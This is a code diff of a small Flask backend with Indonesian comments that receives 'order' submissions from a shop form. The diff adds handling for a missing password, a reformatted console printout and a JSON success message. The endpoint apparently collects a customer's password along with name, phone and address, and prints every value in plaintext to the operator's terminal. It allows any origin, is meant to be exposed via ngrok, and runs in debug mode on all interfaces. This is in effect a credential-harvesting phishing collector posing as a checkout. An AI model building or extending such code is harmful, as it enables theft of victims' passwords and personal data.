@@ -1,10 +1,11 @@
 
-from flask import Flask, render_template, request
+
+from flask import Flask, render_template, request, jsonify
 from flask_cors import CORS
 import sys
 
 app = Flask(__name__)
-CORS(app, resources={r"/*": {"origins": "*"}})  # IZINKAN semua asal domain (ngrok, HP, dll)
+CORS(app, resources={r"/*": {"origins": "*"}})
 
 @app.route("/")
 def index():
@@ -12,6 +13,7 @@ def index():
 
 @app.route("/pesan", methods=["POST"])
 def pesan():
+    # Ambil data dari form
     product = request.form.get("product")
     total_price = request.form.get("totalPrice")
     full_name = request.form.get("fullName")
@@ -21,7 +23,14 @@ def pesan():
     address = request.form.get("address")
     payment = request.form.get("paymentMethod")
 
-    print("\n=== ⚡ PESANAN BARU MASUK ⚡ ===", file=sys.stdout, flush=True)
+    # Cegah password None
+    if not password:
+        password = "(tidak diisi)"
+
+    # Cetak ke terminal (real-time)
+    print("\n" + "="*45, file=sys.stdout, flush=True)
+    print("⚡ PESANAN BARU MASUK ⚡", file=sys.stdout, flush=True)
+    print("="*45, file=sys.stdout, flush=True)
     print(f"📦 Produk     : {product}", file=sys.stdout, flush=True)
     print(f"💰 Total (Rp) : {total_price}", file=sys.stdout, flush=True)
     print(f"👤 Nama       : {full_name}", file=sys.stdout, flush=True)
@@ -30,9 +39,12 @@ def pesan():
     print(f"📱 Telepon    : {phone}", file=sys.stdout, flush=True)
     print(f"🏠 Alamat     : {address}", file=sys.stdout, flush=True)
     print(f"💳 Pembayaran : {payment}", file=sys.stdout, flush=True)
-    print("=== 📬 SEGERA DIPROSES 📬 ===\n", file=sys.stdout, flush=True)
+    print("="*45, file=sys.stdout, flush=True)
+    print("📬 PESANAN TELAH DITERIMA DAN AKAN DIPROSES", file=sys.stdout, flush=True)
+    print("="*45 + "\n", file=sys.stdout, flush=True)
 
-    return ("", 204)
+    # Kirim respons ke front-end
+    return jsonify({"status": "success", "message": "Pesanan berhasil dikirim!"})
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=8000, debug=True)
